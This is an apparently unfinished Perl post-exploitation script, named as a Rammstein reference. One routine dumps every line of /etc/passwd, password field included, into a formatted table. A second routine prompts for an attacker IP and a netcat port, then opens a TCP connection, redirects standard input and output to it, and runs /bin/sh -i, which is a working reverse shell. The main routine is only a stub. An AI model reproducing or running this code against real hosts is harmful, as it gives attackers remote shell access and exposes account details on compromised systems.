#!/usr/bin/perl

#-- Post exploit payload
#-- Yes, this program name is a Rammstein reference

use strict;
use warnings;
use Term::ANSIColor;
use Socket;

#---------------------------------#
system ('clear');
#---------------------------------#
main();
#---------------------------------#
sub main {
	print color('bright_cyan');
	
}



#---------------------------------#
#-- User Info grabbing -- Working on output formatting
sub passwd {
    open(PASSWD, "</etc/passwd");

    print color('bright_magenta');
    print "+-------------------------------------------------------------+\n";
    print "+ UID | GUID | UserName | Password | Real Name | Home | Shell +\n";
    print "+-------------------------------------------------------------+\n";
    while (<PASSWD>) {
		chomp($_);
        my ($user, $pass, $uid, $gid, $real, $home, $shell) = split /:/, $_;
        print "+ $uid | $gid | $user | $pass | $real | $home | $shell \n";
    }
    print color('reset');
    close PASSWD;
}
#---------------------------------#
#-- Reverse shell
sub shell {
    #-- Attacker information
	print color('bright_cyan');
	print "+--------------------------------------+\n";
	print "+ No harm in having another shell\n";
	print "+ What is your IP address: ";
	print color('bright_red');
	chomp(our $ip = <STDIN>);
	print color('bright_cyan');
	print "+ What port did you open in NetCat: ";
	print color('bright_red');
	chomp(our $port = <STDIN>);
	print "+--------------------------------------+\n";
	print color('reset');


	socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
	if (connect(S,sockaddr_in($port,inet_aton($ip)))){
		open(STDIN, ">&S");
		open(STDOUT, ">&S");
		open(STDERR, ">&S");
		exec("/bin/sh -i");
	}
	else {
		print color('bright_red'), "Unable to open a shell!!\n";
	}

}
